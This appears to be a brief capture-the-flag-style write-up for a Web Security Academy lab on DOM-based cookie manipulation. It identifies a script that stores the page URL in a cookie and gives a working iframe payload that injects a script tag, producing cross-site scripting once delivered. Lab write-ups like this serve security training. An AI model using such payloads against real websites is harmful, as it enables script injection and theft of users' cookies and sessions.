DOM-based cookie manipulation

Browse around a bit and click on a block and check the page source. There's a script towards the bottom:

<script>
    document.cookie = 'lastViewedProduct=' + window.location
</script>

So let's build a payload that makes use of that cookie function:


<iframe src="https://ac8e1f8f1e94867f809d6d8400be0085.web-security-academy.net/product?productId=1&'><script>alert(document.cookie)</script>" onload="if(!window.x)this.src='https://ac8e1f8f1e94867f809d6d8400be0085.web-security-academy.net';window.x=1;"> 

You can test it yourself and you should get an XSS. Deliver it and you're done.
